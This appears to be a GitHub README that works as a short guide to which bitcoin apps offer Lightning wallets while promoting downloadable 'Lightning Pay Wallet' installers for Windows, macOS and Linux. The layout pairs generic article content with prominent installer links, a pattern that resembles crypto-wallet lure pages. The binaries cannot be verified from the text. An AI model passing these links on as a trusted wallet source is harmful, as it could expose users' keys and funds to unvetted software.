<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>

# Which bitcoin apps have a Lightning wallet built in

A short field guide to the categories, and how to check any app in thirty seconds.

<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe">lightning-pay-wallet-windows-v1.2.1.exe</a> |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg">lightning-pay-wallet-macos-v1.2.1.dmg</a> |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip">lightning-pay-wallet-linux-v1.2.1.zip</a> |

</div>

Every file above is published on <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the Lightning Pay Wallet release page</a> under the same names, and that page is the only place the installers should come from.

> **Only download from this GitHub release page.**

The list changes too often to be worth memorising, but the categories do not. Knowing which kind of app
you are looking at tells you what its Lightning support will be like.

## Category one: exchanges and payment apps

Cash App, Coinbase, Binance and similar. They can move bitcoin over Lightning where their product
supports it, and the balance is custodial. Convenient, recoverable by login, and subject to account
rules.

## Category two: multi-asset consumer wallets

Wallets holding many coins. Lightning support varies by version, and when present the balance is often
custodial or held through a partner. Check the receive screen: if there is no channel view, the keys are
not yours.

## Category three: bitcoin-first wallets

Wallets built only for bitcoin, desktop or mobile. These are the ones that tend to be non-custodial for
Lightning as well, because the whole design assumes you hold keys. They also expect you to keep a
phrase.

## Category four: node software

Tools for people running infrastructure: peer management, liquidity, routing fees. Powerful and not
what most people want, because the maintenance is the point.

## The thirty-second check

Open the app. Look for a receive screen with a Lightning option. Look for a channel or capacity view.
Look for a recovery phrase and ask whether it restores the Lightning balance or only the on-chain one.
Those three observations classify almost any app.

## Why the brand name is a poor guide

The same brand can ship Lightning on one platform and not another, add it in a release and remove it
later, or route it through a partner. A list written this month is wrong next quarter; the check in the
app is not.

## Where this wallet sits

It is category three: bitcoin-first, non-custodial, desktop, with channels managed for you. That means a
phrase to keep and no account to log into.

## Questions people ask

### Which app is best?

The one whose custody model matches what you are protecting against. That is a personal answer, not a
ranking.

### Can I have Lightning in more than one app?

Yes, and many people do: a custodial app for convenience, a self-custodial wallet for savings.

### Do any of these need a node?

Only category four. The others hide the node behind the interface.

## Related guides

- <a href="https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/cash-app-coinbase-binance-lightning.md">Cash App, Coinbase and Binance: are they Lightning wallets?</a>
- <a href="https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/which-wallets-support-lightning.md">Which wallets support Lightning, compared by what they actually do</a>
- <a href="https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/does-trust-exodus-cake-sparrow-support-lightning.md">Does Trust Wallet, Exodus, Cake or Sparrow support Lightning?</a>

